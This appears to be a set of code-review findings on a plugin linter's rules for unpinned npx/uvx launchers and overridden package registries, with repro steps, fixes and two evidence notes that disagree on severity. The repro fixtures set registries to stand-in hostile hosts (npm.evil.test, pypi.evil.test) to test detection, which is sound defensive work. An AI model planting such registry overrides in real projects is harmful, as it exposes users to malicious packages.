findings.repro: Copy test/fixtures/listing/plugin-valid and put {"mcpServers":{"acme-local":{"command":"npm","args":["exec","--yes","@acme/notes-mcp"]}}} in .mcp.json, plus an .npmrc containing `registry=https://npm.evil.test/`. `node dist/cli.js --plugin-dir <dir> --format json` gives no LST-008 and no LST-009. With command npx and args [-y, @acme/notes-mcp] both fire. The same misses happen with uv [tool, run, acme-mcp] and cmd [/c, npx, -y, @acme/notes-mcp]. launcherOf([npm,x,--yes,pkg]), launcherOf([bun,x,pkg]), launcherOf([pnpx,pkg]) and launcherOf([env,A=1,npx,pkg]) all return undefined. launcherOf([uv,run,server.py,--locked]) returns pinned:true.
findings.fix: Normalise argv before matching. Strip a leading `env` with its K=V words and a `cmd /c`, `cmd.exe /c` or `sh -c`/`bash -c` wrapper (split the single string). Map `npm exec`/`npm x`/`pnpx` to npx, `bun x` to bunx and `uv tool run` to uvx. For `uv run`, look for --locked/--frozen only among the options before the first positional or `--`. Add launcherOf unit cases for each form. A finding on a newly recognised form stays at the rule's current error severity, because it is the same documented block (exact version required).

votes.evidence:
I read src/rules/listing.ts at 1f24aba with git show. I did not build or run anything, because the code path is deterministic and has no other branches.

How launcherOf (lines 79-105) works:
- It takes b0 = launcherBase(argv[0]). This strips the path and any .cmd/.exe/.ps1 suffix and lowercases the name.
- It recognises only three cases: b0 in [npx, bunx, uvx]; (pnpm|yarn) followed by argv[1]==='dlx'; and pipx run.
- uv run is matched only when argv[1]==='run'. For it, pinned is computed as `argv.includes('--locked') || argv.includes('--frozen')`, which looks at the whole argv.
- Every other form returns undefined. That covers npm exec/x, bun x, uv tool run, pnpx, cmd /c npx and env K=V npx.

Effect on the rules:
- argvOf (lines 60-64) only joins command and args. It does not unwrap cmd /c or env.
- LST-008 (line 285) returns [] when l is undefined.
- LST-009 (line 304) decides whether a launcher is present with `pluginServers(p).some(s => launcherOf(argvOf(s.cfg)))`. When no launcher is found it returns early, so .npmrc registry lines are never checked. I found no other code that compensates.

Tests: test/remediation-w6b-listing.test.ts:200-214 covers only the recognised forms. `uv run --frozen` is tested only with the flag before the script.

The uv run case is a real bug inside the documented scope. In `uv run server.py --locked`, the flag after the script goes to the server, not to uv. The code still marks this as pinned, which is a false negative for a spec'd check (spec.md:1170 says "uv run needs --locked/--frozen").

The other forms are outside the documented scope. spec.md:1170 and the LST-008 rationale list exactly npx, bunx, pnpm dlx, yarn dlx, uvx, pipx run and uv run, and the directory's block texts name only "Unpinned npx/uvx launcher". So missing npm exec, bun x, pnpx, uv tool run, cmd /c and env wrappers is a coverage gap / enhancement, not a departure from the spec.

None of this appears in FINDINGS.md or REMEDIATION.md, so it was not reported before.

Severity: low rather than medium. Every case is a false negative and none can cause a false BLOCKED. Most of the forms are outside the spec's launcher list, and the spec-scope uv run case needs a misplaced flag.

For uv run it sets pinned = argv.includes('--locked')||argv.includes('--frozen') over the whole argv, so a flag after the script name still counts. LST-009 runs only if launcherOf finds a launcher in the plugin.

I built the CLI in a detached worktree. For each launcher form I copied test/fixtures/listing/plugin-valid, wrote .mcp.json with that form and added .npmrc `registry=https://npm.evil.test/`, then ran `node dist/cli.js --plugin-dir <d> --format json`:
- npx -y @acme/notes-mcp: LST-008 and LST-009 both fire.
- uv run server.py: LST-008 and LST-009 both fire.
- npm exec --yes, npm x --yes, bun x, pnpx, uv tool run, cmd /c npx -y and env A=1 npx -y: neither LST-008 nor LST-009 fires.
- uv run server.py --locked: only LST-009 fires, so LST-008 is a false negative.

FINDINGS.md and REMEDIATION.md do not list this item as fixed, refuted or deferred. spec.md defers "scripts that start launchers", which is a different case from these inline argv forms.

Severity medium: these are false negatives in rules rated claude: error. npm exec and npm x run the same tool as npx, and cmd /c npx is the usual Windows form, so they are not edge cases. Detection would stay deterministic. It is not high because the rule's rationale lists only the launchers it covers.

findings.title: LST-009 ignores pyproject.toml [tool.uv] / [[tool.uv.index]], the most common place a uv project sets its package index
findings.claim: PACKAGE_CONFIG_FILES contains only .npmrc, .yarnrc, .yarnrc.yml, bunfig.toml, uv.toml, pip.conf and pip.ini. In a plugin that runs `uv run`, the index can also be set in pyproject.toml, through [[tool.uv.index]] or [tool.uv] index-url/extra-index-url, and uv honours it just like uv.toml. That file is never read, so LST-009 misses the same package-source configuration it reports when it sits in uv.toml. PACKAGE_SOURCE also only accepts a bare `[[index`, so `[[tool.uv.index]]` would not match even if the file were read.
findings.repro:
Copy plugin-valid. Set .mcp.json to {"mcpServers":{"acme-local":{"command":"uv","args":["run","server.py"]}}} and add a pyproject.toml with `[[tool.uv.index]]
name="corp"
url="https://pypi.evil.test/simple"
default=true`. The run reports only LST-008 and no LST-009. Moving the same table into uv.toml as [[index]] produces `LST-009 uv.toml sets a package source`.
findings.fix: Read pyproject.toml at any depth, since the walk already lists it, and test only its [tool.uv] / [[tool.uv.index]] / [tool.uv.pip] sections: extend PACKAGE_SOURCE with `\[\[?\s*tool\.uv(\.index|\.pip)?\s*\]\]?` and match index-url/extra-index-url/find-links inside it. Add a fixture test. Severity stays as LST-009's.

votes.evidence: At 1f24aba, src/listing/load.ts:21 defines PACKAGE_CONFIG_FILES = {.npmrc, .yarnrc, .yarnrc.yml, bunfig.toml, uv.toml, pip.conf, pip.ini}. load.ts:170-172 fills plugin.packageConfigs only from files whose basename is in that set, so pyproject.toml is never read. `git grep -i pyproject 1f24aba -- src test` returns nothing. LST-009 (src/rules/listing.ts:300-309) tests only p.packageConfigs against PACKAGE_SOURCE. That regex (listing.ts:293) has the table alternative `\[\[?\s*(index|install\.scopes|install\.registry)...`, which needs `index` right after the bracket, so `[[tool.uv.index]]` would not match even if the file were read. Only keys like `index-url =` / `extra-index-url =` under [tool.uv] would match. uv run is counted as a launcher (LST-008 handles `uv run` without --locked), so the repro gives LST-008 without LST-009. uv.toml with `[[index]]` matches and gets reported. Neither FINDINGS.md nor REMEDIATION.md mentions pyproject or tool.uv, so this is not a known or deferred item. I confirmed this by reading the code and did not run the CLI. Low severity holds: it is a coverage gap in a detection rule, not a false positive.
